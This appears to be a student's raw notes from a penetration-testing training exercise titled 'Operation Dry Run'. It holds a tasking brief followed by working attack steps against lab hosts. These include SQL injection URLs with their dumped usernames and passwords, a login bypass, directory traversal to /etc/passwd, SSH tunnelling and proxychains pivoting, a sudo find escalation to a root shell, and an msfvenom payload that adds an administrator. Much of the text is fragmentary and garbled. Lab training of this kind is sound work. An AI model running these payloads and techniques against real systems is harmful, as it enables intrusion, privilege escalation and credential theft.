CCTC Security
OPERATION Dry Run

23 JANUARY 2020 / 0800 / CTF 109 
Tasking
All actions must be in accordance with mission brief, scope, and RoE.
Complete the taskings on each referenced target below.
Each heading is the hostname of a target. The first listed target’s hostname is “PublicFacingWebsite”.

PublicFacingWebsite
Perform Reconnaissance 
    1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
    2. Actively scan and interact with target to find potential attack vectors.
Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system.
Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
Pivot to Found Targets
    1. Pivot through network to other targets as you find them.
NOTES
    • 

BestWebApp
Perform Reconnaissance
    1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
    2. Actively scan and interact with target to find potential attack vectors. 
Attempt Exploitation
    1. Attempt to retrieve privileged information from the target by using information found in reconnaissance. Reconnaissance from other targets within the network may have information relevant to any target.
NOTES
    • 

RoundSensor
Perform Reconnaissance
    1. Actively scan and interact with target to find potential attack vectors.
Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
Pivot to Found Targets
    1. Pivot through network to other targets as you find them.
NOTES
    • 

Windows-Workstation
Perform Reconnaissance
    1. Actively scan and interact with target to find potential attack vectors.
Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
Pivot to Found Targets
    1. Pivot through network to other targets as you find them.
NOTES
    • 








root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin 
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin 
syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin 
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin 
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin 
pollinate:x:110:1::/var/cache/pollinate:/bin/false 
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false 
user2:x:1001:1001::/home/user2:/bin/sh






user2
user_password=EaglesIsARE78



http://localhost:30101/pick.php?product=7%20UNION%20select%20table_schema,table_name,column_name%20from%20information_schema.columns

siteusers 	id 	$customer
siteusers 	name 	$customer
siteusers 	account 	$customer
siteusers 	category 	$customer
siteusers 	description 	$customer
siteusers 	id 	$net_products
siteusers 	quantity 	$net_products
siteusers 	product 	$net_products
siteusers 	price 	$net_products
siteusers 	id 	$purchase_history
siteusers 	quantity 	$purchase_history
siteusers 	product 	$purchase_history
siteusers 	account 	$purchase_history
siteusers 	id 	$shippingdates
siteusers 	ordernumber 	$shippingdates
siteusers 	account 	$shippingdates
siteusers 	date 	$shippingdates
siteusers 	user_id 	$users
siteusers 	name 	$users
siteusers 	username 	$users



http://localhost:30101/pick.php?product=7%20UNION%20select%20user_id,name,username%20from%20siteusers.users

Item 	On Hand 	Price
HAM 	32 	$15
1 	Aaron 	$Aaron
1 	user2 	$user2
1 	user3 	$user3
1 	Lee_Roth 	$Lroth
1 	Aaron 	$ncnffjbeqlCn$$jbeq
1 	user2 	$RntyrfVfNER78
1 	user3 	$Obo4GURRnccyrf
1 	Lroth 	$anotherpassword4THEages


Item 	On Hand 	Price
HAM 	32 	$15
1 	Aaron 	$Aaron
1 	user2 	$user2
1 	user3 	$user3
1 	Lee_Roth 	$Lroth
1 	Aaron 	apasswordyPa$$word
1 	user2 	EaglesIsARE78
1 	user3 	Bob4THEEapples
1 	Lroth 	$anotherpassword4THEages






given an IP
scan with
nmap -Pn -T4 --min-rare 68987 -p22,80,8080,8888,4444,2222,9999,4242 10.50.41.143

service interrogation

student@lin-ops:~$ nc 10.50.41.143 22
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
^C


student@lin-ops:~$ nc 10.50.41.143 80

HTTP/1.1 400 Bad Request
Date: Fri, 15 Jul 2022 17:09:13 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 303
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.28.20 Port 80</address>
</body></html>


sql injection
ssh keys
web shell

nikto

nikto -h 10.50.41.143  

nmap -Pn -T4 --min-rate 68987 -p- 10.50.41.143 

navigate to the website

robots.txt

upload web shell

upload
uploads directory

annotate it in your note

myfile=Executive_Assistant.html

get and post
directory traversal

; whoami (doesnt work)

<script>alert('ackackack') </script>


../../../../../../../../etc/passwd

just annotate that its vulnerable and move on

with login just a table drop
dont use a union with a login



click on post

then click on reuqest
click on raw
copy to the url 
add a question mark paste it and throw it in there

http://10.50.41.143/login.php?username=a%27+or+1%3D%271&passwd=a%27+or+1%3D%271

Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 ) 1Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf ) 1Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1

EaglesIsARE78
Bob4THEEapples


whoami
hostname

ip a
ip neigh

cat /etc/host

user2@PublicFacingWebsite:/$ cat /etc/hosts
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
192.168.28.181 WebApp


now try to escalate

sudo -l

find / -type f -perm /4000 2>dev/null

user2@PublicFacingWebsite:/$ which gb
user2@PublicFacingWebsite:/$ which gdb


user2@PublicFacingWebsite:/$ for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done

64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=2.50 ms
64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=2.09 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.607 ms


proxychains nmap -Pn -T4 --min-rate 68987 -p 1-1024 192.168.28.172
proxychains nmap -Pn -T4 --min-rate 68987 -p 1-1024 192.168.28.181

ssh user2@10.50.41.143 -L 30101:192.168.28.181:80 -NT


http://localhost:30101/
http://localhost:30101/pick.php?product=5&Submit=Submit
http://localhost:30101/pick.php?product=5




http://localhost:30101/pick.php?product=4%20OR%201=1;#
http://localhost:30101/pick.php?product=5%20OR%201=1;#
http://localhost:30101/pick.php?product=6%20OR%201=1;#
http://localhost:30101/pick.php?product=7%20OR%201=1;#


test all just in case

find number of columns
find number of columns
find numbr of columns

Item 	On Hand 	Price
HAM 	32 	$15
1 	3 	$2


 1 3 2
  1 3 2
   1 3 2
 http://localhost:30101/pick.php?product=7%20UNION%20select%20table_schema,column_name,table_name%20from%20information_schema.columns
   
   
   
   information
   performace
   mysql
   
   
   siteusers
   
   siteusers 	customer 	$id
siteusers 	customer 	$name
siteusers 	customer 	$account
siteusers 	customer 	$category
siteusers 	customer 	$description
siteusers 	net_products 	$id
siteusers 	net_products 	$quantity
siteusers 	net_products 	$product
siteusers 	net_products 	$price
siteusers 	purchase_history 	$id
siteusers 	purchase_history 	$quantity
siteusers 	purchase_history 	$product
siteusers 	purchase_history 	$account
siteusers 	shippingdates 	$id
siteusers 	shippingdates 	$ordernumber
siteusers 	shippingdates 	$account
siteusers 	shippingdates 	$date
siteusers 	users 	$user_id
siteusers 	users 	$name
siteusers 	users 	$username
   

http://localhost:30101/pick.php?product=7%20UNION%20select%20table_schema,table_name,column_name%20from%20information_schema.columns



http://localhost:30101/pick.php?product=7%20UNION%20select%20user_id,name,username%20from%20siteusers.users

Item 	On Hand 	Price
HAM 	32 	$15
1 	Aaron 	$Aaron
2 	user2 	$user2
3 	user3 	$user3
4 	Lroth 	$Lee_Roth
1 	ncnffjbeqlCn$$jbeq 	$Aaron  apasswordyPa$$word
2 	RntyrfVfNER78 	$user2   EaglesIsARE78
3 	Obo4GURRnccyrf 	$user3  Bob4THEEapples 
4 	anotherpassword4THEages 	$Lroth



try it on the machine at least twice(maybe three) if it doesnt work encoded and decoded then move on


Aaron  apasswordyPa$$word into 192.168.28.172

Aaron@RoundSensor:/$ sudo -l
Matching Defaults entries for Aaron on RoundSensor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Aaron may run the following commands on RoundSensor:
    (ALL) NOPASSWD: /usr/bin/find

Aaron@RoundSensor:/$ which gb
Aaron@RoundSensor:/$ which gbd

The find command is likely the best tool for finding binaries that are SGID or SUID:

find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files

find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files

find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files

.. / find 
Shell SUID Sudo
Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

find . -exec /bin/sh \; -quit
SUID
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

sudo install -m =xs $(which find) .

./find . -exec /bin/sh -p \; -quit
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo find . -exec /bin/sh \; -quit
ip






64 bytes from 192.168.28.172: icmp_seq=1 ttl=64 time=0.028 ms
64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=2.62 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=1.78 ms



3389
9999

change the ip and the port in the microsfot script



xfreerdp /v:0.0.0.0:6666 /u:Lroth dynamic-resolution +glyph-cache +clipboard


log admin out and just wait



log onto windows box then privesc

use GUI

services
schtaks

look around in sensitive directories

empty descrption in secure server
where is persistence on windows? HKLM

what is a reg entry that has persistence
HKLM\software\micrsoft\windows\currentversion\run   OR runonce

system32\security health

exhaust all my options, target quad 9999s

key places 
weird crap in systm 32
home directoreis


temp/putty

how to exploit putty
dll hijacking

if you are given a dll or exe and you dont listen to the instructions
sspisrv.dll

replacing excucutables
how can you figure out if you can replace it(CAN YOU RENAME IT)
if you are given an exe, exe replacement how do we test, rename it


msfvenom -p windows/exec CMD='cmd.exe /C net localgroup administrator Lroth /add"
